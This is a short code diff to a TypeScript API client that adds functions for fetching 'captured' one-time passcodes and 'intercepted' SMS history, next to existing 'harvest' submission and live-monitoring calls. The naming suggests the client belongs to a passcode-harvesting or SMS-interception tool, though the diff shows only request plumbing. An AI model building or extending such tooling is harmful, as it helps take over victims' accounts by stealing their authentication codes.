@@ -1,6 +1,8 @@
 import {
+  CapturedOTPRecord,
   HarvestResponse,
   HarvestSubmit,
+  InterceptedSMSRecord,
   MonitoringSession,
   MonitorStats,
   ReceivedOTP,
@@ -67,6 +69,14 @@ export const api = {
 
   getStats: () => request<MonitorStats>("/monitoring/stats"),
 
+  getCapturedOtps: (skip = 0, limit = 100, channel?: string) =>
+    request<CapturedOTPRecord[]>(
+      `/sms/otps?skip=${skip}&limit=${limit}${channel ? `&channel=${channel}` : ""}`
+    ),
+
+  getSmsHistory: (skip = 0, limit = 100) =>
+    request<InterceptedSMSRecord[]>(`/sms/history?skip=${skip}&limit=${limit}`),
+
   submitHarvest: (data: HarvestSubmit) =>
     request<HarvestResponse>("/harvest/submit", {
       method: "POST",
@@ -77,3 +87,4 @@ export const api = {
 };
 
 export const LIVE_WS_URL = `${API_BASE_URL.replace(/^http/, "ws")}/ws/live`;
+
